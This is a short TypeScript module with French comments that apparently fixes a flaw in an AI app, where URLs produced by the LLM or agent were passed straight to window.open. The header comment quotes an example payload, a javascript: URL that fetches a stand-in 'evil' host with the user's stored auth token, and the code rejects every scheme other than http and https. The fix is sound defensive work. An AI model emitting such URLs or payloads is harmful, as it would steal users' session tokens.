// Ouverture sécurisée d'URLs externes — Syléa.AI
//
// Fix P0 (2026-06) : plusieurs window.open() recevaient des URLs fournies par
// le LLM / l'agent (action.data.url, image_url, gmail_url). Une URL
// `javascript:fetch('//evil/?'+localStorage.sylea_auth_token)` pouvait
// s'exécuter dans le contexte de la page → vol de token.
//
// openExternalSafe() :
//   - n'accepte QUE http: et https: (rejette javascript:, data:, blob:, vbscript:, file:, sylea:…)
//   - rejette les URLs protocol-relative (//evil.com) qui héritent du scheme courant
//   - ouvre toujours avec noopener,noreferrer (empêche window.opener hijack + fuite Referer)
//
// Retourne true si l'ouverture a été tentée, false si l'URL a été rejetée.

export function isSafeExternalUrl(raw: string | null | undefined): boolean {
  if (!raw || typeof raw !== 'string') return false
  const url = raw.trim()
  // Protocol-relative (//host/...) : hérite du scheme courant, ambigu → refus.
  if (url.startsWith('//')) return false
  try {
    // Résout contre l'origine courante pour normaliser ; un scheme dangereux
    // (javascript:, data:…) restera tel quel et sera rejeté ci-dessous.
    const parsed = new URL(url, window.location.origin)
    return parsed.protocol === 'http:' || parsed.protocol === 'https:'
  } catch {
    return false
  }
}

export function openExternalSafe(raw: string | null | undefined): boolean {
  if (!isSafeExternalUrl(raw)) {
    // En dev, aider au debug ; en prod, échec silencieux (pas de leak).
    if (import.meta.env.DEV) {
      // eslint-disable-next-line no-console
      console.warn('[safeOpen] URL rejetée (scheme non http/https) :', raw)
    }
    return false
  }
  window.open(raw as string, '_blank', 'noopener,noreferrer')
  return true
}
